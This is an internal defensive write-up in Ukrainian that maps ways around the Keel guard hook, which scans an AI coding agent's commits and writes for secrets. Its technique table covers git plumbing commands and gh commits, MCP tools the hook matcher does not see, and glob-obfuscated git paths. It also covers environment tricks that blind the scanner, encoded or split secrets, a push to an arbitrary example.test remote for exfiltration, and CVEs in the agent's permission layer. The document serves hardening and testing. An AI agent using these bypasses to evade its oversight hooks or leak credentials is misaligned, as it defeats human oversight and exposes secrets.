---
title: Оборонне дослідження обходів гейта Keel (guard)
status: internal-defensive
created: 2026-11-07
scope: тест-кейси для власного захисту; усі приклади нешкідливі (тестовий репозиторій, example.test, синтетичні маркери)
---

# Обходи гейта Keel — карта технік і тест-кейси

Оборонний матеріал для зміцнення власного класу захисту плагіна Keel. Мета — перетворити
публічно задокументовані техніки обходу commit/secret-гейтів на регрес-тести. Жодного
справжнього секрета, жодної чужої адреси: усі приклади ганяються на **тимчасовому тестовому
репозиторії**, маркери секретів — **синтетичні** (форма збігається з патерном, значення фіктивне),
хости — `example.test`.

> Дивимось на **клас захисту**, не на номери рядків (файл `guard.py` переписується).

## Модель захисту, як я її прочитав (станом на цей зріз коду)

Клас захисту = **PreToolUse-хук Keel** (`hooks/hooks.json`, matcher `Bash|PowerShell|Write|Edit|NotebookEdit`)
→ `guard.decide` → дві гілки:

- **`check_write`** (Write/Edit/NotebookEdit): (1) блокує запис у стан Keel / `inbox/DECISIONS.md` (`_protected`);
  (2) сканує новий вміст на секрети (`secretscan.scan_text`), окрім git-ignored файлів.
- **`check_shell`** (Bash/PowerShell): (1) сканує **текст команди** на секрети-форми; (2) якщо
  `GIT_COMMIT`/`GIT_PUSH` впізнали коміт/пуш — блокує `--no-verify`/`-n`, тоді сканує **реальний стан git**
  (`scan_staged` / `scan_worktree_changes` / `scan_unpushed`) на секрети в diff.
- **fail-closed**: виняток під час перевірки Write або впізнаного commit/push → код 2 (блок); інакше код 0.

Другий рубіж — git-native `pre-commit` (`project.py::PRE_COMMIT`), що викликає `python -m keel scan --staged`.

Ключова властивість: гейт — це **сканер секретів + заборона обходу хука**, а не заборона комітів.
«Обхід» означає одне з двох:
- **Ціль A** — провести секрет у git попри гейт (сканер не спрацював або дивиться не туди);
- **Ціль B** — зробити коміт/пуш так, щоб хук Keel його не впізнав як коміт/пуш, або взагалі не побачив виклику.

Три структурні слабкі точки, навколо яких групуються всі знахідки нижче:
1. **Впізнавання коміту — регексом по тексту команди.** Будь-яка форма git, що не містить
   `git … commit`/`git … push` в одному сегменті (`[^;&|\n]*`), не вмикає сканування стану.
2. **Поверхня інструментів — лише matcher хука.** Усе, що не Bash/PowerShell/Write/Edit/NotebookEdit
   (MCP-shell, MCP-запис у файл, `gh`), хук не бачить узагалі.
3. **Власний git сканера не загартований.** `secretscan._git` і `scan_unpushed` викликають `git diff`/`git show`
   зі **успадкованим середовищем** і без `--no-ext-diff`/`--no-textconv` — зовнішній diff/textconv/filter
   може сам знекровити вивід, який сканер потім «перевіряє».

---

## Таблиця технік

Легенда «чи ловить наш клас» (оцінка за кодом): **ТАК** / **ЧАСТКОВО** / **НІ** / **н/д (поза гейтом)**.

| # | Техніка | Клас | Тест-команда (нешкідлива, тест-репо / example.test) | Ловить? | Рекомендація | Джерело · дата перевірки |
|---|---------|------|------------------------------------------------------|---------|--------------|--------------------------|
| 1 | `git commit-tree` + `git update-ref` (коміт із довільного дерева, рух гілки без `git commit`) | git-plumbing | `t=$(git write-tree); c=$(echo m \| git commit-tree $t -p HEAD); git update-ref refs/heads/main $c` | ЧАСТКОВО | `commit-tree` регекс впізнає (→ `scan_staged`), але якщо дерево зібране через `hash-object`/`mktree` повз індекс — staged-diff порожній, секрет не видно; `update-ref` не впізнається зовсім. Ground-truth має бути `reference-transaction`-хук | git-scm commit-tree · 2026-11-07 |
| 2 | `git fast-import` (пише коміти й refs напряму) | git-plumbing | `printf 'commit refs/heads/x\\ncommitter a <a@example.test> now\\n...' \| git fast-import` | НІ | Немає токена `commit`/`push` → сканування не вмикається, і сам fast-import не кличе `pre-commit`. Додати plumbing-дієслова до детекції + `reference-transaction` | git-scm fast-import · 2026-11-07 |
| 3 | `git am` / `git apply --index` (патч створює коміт) | git-plumbing | `git am ./fixture.eml` (де fixture.eml — патч із синтетичним маркером) | НІ | `git am` не містить `commit`/`push`; кличе лише applypatch-хуки, не `pre-commit`. Матчити `am`/`apply`, або `reference-transaction` | git-scm githooks · 2026-11-07 |
| 4 | `gh api` / `gh pr create` / `gh release` (коміт/пуш через GitHub API) | поверхня-інструментів | `gh api -X PUT repos/O/R/contents/f --field content=@fixture` (на тест-репо) | НІ | Токен — `gh`, не `git`; `GIT_COMMIT`/`GIT_PUSH` не спрацьовують. `gh` присутній у PATH. Матчити `\bgh\b … (api\|pr\|release\|repo)` або серверний гейт | GitHub advisories (контекст) · 2026-11-07 |
| 5 | Сканер власним `git diff` виконує `diff.external`/textconv і бачить знекровлений вивід | git-config/scanner | у тест-репо: `git -c diff.external=true commit -am x` (external diff глушить `+`-рядки сканера) | ЧАСТКОВО/НІ | `secretscan._git` не додає `--no-ext-diff`; `scan_unpushed` через `git show` ще й застосовує textconv. Викликати сканерний git з `-c diff.external= --no-ext-diff --no-textconv -c core.fsmonitor= -c core.pager=cat` | git-scm git-config · 2026-11-07 |
| 6 | `GIT_EXTERNAL_DIFF` / `GIT_CONFIG_*` у середовищі, успадкованому сканером | git-env/scanner | `GIT_EXTERNAL_DIFF=true git commit -am x` у тест-репо | ЧАСТКОВО/НІ | `secretscan._git`/`scan_unpushed` запускають git з повним `os.environ`. Запускати сканерний git із **вимитим** середовищем (прибрати `GIT_*`, `GIT_EXTERNAL_DIFF`, `GIT_CONFIG*`) | git-scm git-config · 2026-11-07 |
| 7 | `core.fsmonitor` = команда (виконується на `git diff`/`status` сканера) | git-config/scanner | `git -c core.fsmonitor=/path/script status` у тест-репо | ЧАСТКОВО | Ризик виконання стороннього коду під час самого сканування. Нейтралізувати в сканерному виклику (`-c core.fsmonitor=`) | git-scm git-config · 2026-11-07 |
| 8 | MCP-shell запускає git повз matcher: `mcp__terminal__run_in_terminal`, desktop-commander `start_process`+`interact_with_process` | поверхня-інструментів | через MCP-термінал: `git commit -am x` у тест-репо | НІ (повністю) | Хук Keel на ці інструменти не навішений узагалі → жодної перевірки. Обидва MCP присутні в цьому середовищі. Покладатись на git-native `pre-commit`/`reference-transaction` (єдиний спільний рубіж для будь-якого shell) + за потреби deny цих MCP | CC hooks (matcher на tool_name) · 2026-11-07 |
| 9 | MCP-запис у файл: desktop-commander `write_file`/`edit_block`, конектори | поверхня-інструментів | через MCP: записати синтетичний ключ у `secrets.txt` або у стан Keel | НІ | Не Write/Edit/NotebookEdit → `check_write` (вкл. `_protected`) обійдено; стан Keel стає записуваним. Commit-гейт спіймає лише якщо той самий secret потім іде через впізнаний `git commit` | CC hooks (matcher) · 2026-11-07 |
| 10 | `MultiEdit` (історичний tool CC) поза matcher-ом | поверхня-інструментів | n/d у цьому середовищі (інструмент не в списку сесії) | НІ (якщо присутній) | `Edit` у matcher-і точний; `Edit.*` матчив би `NotebookEdit`, але не `MultiEdit`. Розширити matcher до `Edit\|MultiEdit\|NotebookEdit` або `.*Edit`. **Не підтверджено**, що tool активний тут | CC hooks (`Edit.*` приклад) · 2026-11-07 |
| 11 | Секрет, розбитий на кілька доданих рядків (конкатенація) | scanner-evasion | у fixture: `K="AKIA" + "EXAMPLE0000000000"` двома рядками | НІ | `scan_text` порядково; shape/assign-регекси не бачать склейки. Додати перевірку склеєного логічного вмісту + ентропійний прохід | gitleaks (клас evasion) · 2026-11-07 |
| 12 | Секрет закодований (base64/hex) у комітнутому файлі | scanner-evasion | fixture містить `QUtJQUVYQU1QTEU...` (base64 синтетичного маркера) | НІ | Жоден патерн не збігається з кодованою формою. Фундаментальна межа регексу; потрібен ентропійний/декодувальний прохід на високоентропійні додані блоки | gitleaks · 2026-11-07 |
| 13 | Секрет у бінарному або не-TEXT_SUFFIX файлі | scanner-evasion | `git add payload.bin` (синтетичний маркер усередині), далі commit | НІ | Staged-diff бінарника = «Binary files differ», `+`-рядків нема → `scan_diff` порожній; untracked з не-whitelisted суфіксом `scan_worktree` пропускає. Для staged детектувати бінарник і сканувати сирий blob/ентропію, не покладатись на allowlist суфіксів | secretscan.py (TEXT_SUFFIXES) + gitleaks · 2026-11-07 |
| 14 | Прагма-придушення: `secret-scan: ignore` (і стиль `#gitleaks:allow`) | scanner-evasion | у fixture дописати в рядок ` # secret-scan: ignore` | ЧАСТКОВО | У `scan_text` прагма/коментар глушить лише ASSIGN-патерни; shape-токени (AWS/Google/…) лишаються. Для машинного commit-гейта не шанувати прагму або журналювати її вжиток | secretscan.py + gitleaks (`gitleaks:allow`) · 2026-11-07 |
| 15 | Підпорогові ASSIGN-евристики (len<12, entropy<3.0, placeholder-подібний префікс) | scanner-evasion | fixture: `password = "testtest1234"` (підлаштовано під placeholder-регекс) | ЧАСТКОВО | Shape-токени все одно ловляться; під ризиком лише generic-assign. Лишковий ризик, прийнятний, але задокументувати | secretscan.py · 2026-11-07 |
| 16 | Шлях до git через glob/substitution: `/usr/bin/g?t`, `$(command -v git)`, `{g,}it` | shell-obfuscation | `/usr/bin/g?t commit -am x` у тест-репо | НІ | Текст не містить `\bgit\b` → `GIT_COMMIT` мимо → сканування стану не вмикається (і `--no-verify`-детект теж). Узагальнює відомий `g""it`. Ground-truth — git-native хук, не розбір тексту | git-scm (поведінка glob) · 2026-11-07 |
| 17 | Ексфільтрація пушем у довільний remote (payload не secret-формою) | exfil | `git remote add x https://example.test/r; git push x` у тест-репо | ЧАСТКОВО | URL із `user:pass@` у тексті команди ловиться (`dsn-password`), але `remote set-url` + пізніший push зберігає креди в `.git/config` (не сканується), а сам факт пушу в чужий remote гейт не блокує | guard.check_shell · 2026-11-07 |
| 18 | Deny-degradation CC при >50 підкомандах (padding `true && …`) | CC-parsing | `true && true && … (×50) && git commit -am x` | ТАК (хук Keel) | Проблема стосується **deny-правил CC**, не хука Keel: PreToolUse спрацьовує до виконання незалежно від deny-гілки, і `GIT_COMMIT` впізнає коміт у хвості. Корисно як регрес-тест + тримати CC ≥ 2.1.90 | Adversa AI, 2026-04-02 (fix «seemingly» v2.1.90, не звірено в Anthropic) · 2026-11-07 |
| 19 | CC command-parsing CVE (клас): `$IFS`/короткі прапорці, `find`, piped `sed`+`echo`, `cd` у `.claude`, `echo` | CC-CVE | тримати оновлення; регрес на кожен патерн у тест-репо | ТАК (для цілей Keel) | Ці CVE обходять **дозвільний прошарок CC**, не секрет/commit-логіку хука Keel (хук бачить виклик до виконання). Defense-in-depth: CC ≥ 2.0.72. Номери звірено нижче | GHSA (див. нижче) · 2026-11-07 |

### Звірені CVE (кожен номер відкрито на GHSA)

| CVE | GHSA | Суть (корінь) | Affected / Patched | Опубліковано |
|-----|------|----------------|--------------------|--------------|
| CVE-2025-66032 | GHSA-xq4m-mc3c-vvg3 | `$IFS` + короткі CLI-прапорці обходять read-only валідацію → RCE | < 1.0.93 / 1.0.93 | 2025-12-03 |
| CVE-2026-24887 | GHSA-qgqw-h4xq-7w8w | Помилка розбору команди `find` обходить prompt підтвердження | < 2.0.72 / 2.0.72 | 2026-02-03 |
| CVE-2026-25723 | GHSA-mhg7-666j-cqg4 | piped `sed` + `echo` обходять обмеження запису файлів (вкл. `.claude`) | < 2.0.55 / 2.0.55 | 2026-02-06 |
| CVE-2026-25722 | GHSA-66q4-vfjg-2qhh | `cd` у захищені теки обходить захист запису | < 2.0.57 / 2.0.57 | 2026-02-06 |
| CVE-2025-54795 | GHSA-x56v-x2h6-7j34 | `echo` обходить prompt підтвердження (не звірено індивідуально; з агрегації пошуку) | < 1.0.20 / 1.0.20 | — |

---

## ТОП-10 за «реальний ризик / вартість закриття»

1. **MCP-shell повз matcher (#8).** Найважче й найдешевше закрити архітектурно: git-native `pre-commit` і
   `reference-transaction`-хук — єдиний рубіж, спільний для Bash, PowerShell, MCP-терміналу й desktop-commander.
2. **git-plumbing повз детекцію (#1–3): `fast-import`, `commit-tree`+`update-ref`, `am`/`apply`.** Закривається
   тим самим `reference-transaction`-хуком (будь-який рух ref, і його **не** вимикає `--no-verify`).
3. **`gh` як канал коміту/пушу (#4).** Дешево: додати `gh`-дієслова запису в детекцію або серверний гейт.
4. **Незагартований git сканера (#5–7).** Дешево й важливо: `--no-ext-diff --no-textconv`, вимите середовище,
   нейтралізація `core.fsmonitor`/`core.pager` у **власних** викликах сканера.
5. **Секрет у бінарному/не-whitelisted файлі (#13).** Для staged — детект бінарника + ентропія сирого blob.
6. **MCP-запис у файл обходить `check_write`/`_protected` (#9).** Тримати стан Keel поза записуваним моделлю
   шляхом; покладатись на commit-stage-скан.
7. **Розбиття секрета на рядки (#11).** Додати склейку логічних значень перед shape-матчем.
8. **Кодований секрет (#12).** Ентропійний прохід на додані високоентропійні рядки/блоби.
9. **glob/substitution для `git` (#16).** Знову закривається git-native хуком, не латанням регексу тексту.
10. **Тримати Claude Code ≥ 2.1.90 (#18–19).** Defense-in-depth проти deny-degradation і parsing-CVE.

## Що регекс по тексту команди принципово НЕ закриває

- **«Це коміт?» — нерозв'язно текстом.** Нескінченні написання (glob, підстановка, plumbing, зовнішній
  бінарник, MCP) роблять розпізнавання за рядком команди ненадійним у принципі. Ground-truth мусить бути
  git-native подією (`reference-transaction`/`pre-commit`), а не розбором тексту.
- **«Це секрет?» після кодування/розбиття.** Регекс-форми ловлять лише буквальну форму; base64/hex/склейка
  дають хибний негатив. Потрібні ентропія/декодування, і навіть вони не ловлять кодоване напевно.
- **Вміст, що йде каналами поза хуком.** MCP-інструменти, під-агент іншого агента, мережеві конектори —
  хук їх не бачить, тож їх не покриє жоден його регекс.
- **Намір ексфільтрації.** Регекс не відрізнить легітимний URL від каналу витоку (WebFetch, remote, конектор,
  рендер зображення, DNS) — це lethal-trifecta, розв'язується на рівні дозволів/ізоляції, не патерном.

## Головна архітектурна рекомендація

PreToolUse-хук Keel — корисний **ранній** гейт, але не ground-truth. Єдиний рубіж, що спрацьовує
**незалежно від написання команди й від того, який інструмент/MCP кликав git**, — це git-native хук на
подію. `reference-transaction` (githooks) викликається **будь-якою** командою, що оновлює ref (вкл.
`commit-tree`+`update-ref`, `fast-import`, `am`), і **не** вимикається `--no-verify`. Разом із загартуванням
власного git сканера (п.4) це закриває більшість ТОП-10 одним ходом. Для чужих менеджерів хуків (коли
`core.hooksPath` вже задано — `project.py::hook_plan` тоді пропускає інсталяцію) потрібен явний fallback,
інакше другий рубіж зникає саме там, де найпотрібніший.

## Статус звірки

- **Відкрито на першоджерелі (12):** git-scm githooks, git-config, git-commit-tree, git-fast-import;
  code.claude.com permissions, hooks; github.com/gitleaks/gitleaks; adversa.ai (deny-degradation);
  GHSA-xq4m-mc3c-vvg3, GHSA-qgqw-h4xq-7w8w, GHSA-mhg7-666j-cqg4, GHSA-66q4-vfjg-2qhh.
- **Лише з агрегації пошуку, індивідуально не відкрито (2):** CVE-2025-54795 (echo-bypass); «lethal trifecta»
  (Simon Willison) — концепт підтверджено вторинними джерелами, первинний пост не відкрито. Позначено в тексті.
- **Не підтверджено:** присутність tool `MultiEdit` у цьому середовищі (#10); fix deny-degradation саме у
  v2.1.90 (Adversa пише «seemingly», в Anthropic не звірено).
